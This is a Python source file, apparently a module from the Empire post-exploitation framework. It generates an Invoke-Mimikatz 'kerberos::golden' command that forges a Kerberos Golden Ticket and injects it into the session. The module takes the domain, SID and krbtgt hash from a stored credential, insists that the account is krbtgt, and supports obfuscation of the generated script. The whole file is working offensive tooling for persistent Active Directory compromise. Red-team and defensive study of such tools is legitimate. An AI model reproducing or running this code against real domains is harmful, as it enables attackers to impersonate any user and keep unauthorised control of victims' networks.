from __future__ import print_function

import pathlib
from builtins import object, str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.database.models import Credential
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: PydanticModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":

            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)
            if cred.username != "krbtgt":
                return handle_error_message("[!] A krbtgt account must be used")

            if cred.domain != "":
                params["domain"] = cred.domain
            if cred.sid != "":
                params["sid"] = cred.sid
            if cred.password != "":
                params["krbtgt"] = cred.password

        if params["krbtgt"] == "":
            print(helpers.color("[!] krbtgt hash not specified"))

        # build the golden ticket command
        script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "credid":
                if values and values != "":
                    script_end += " /" + str(option) + ":" + str(values)

        script_end += " /ptt\"'"

        script = main_menu.modules.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
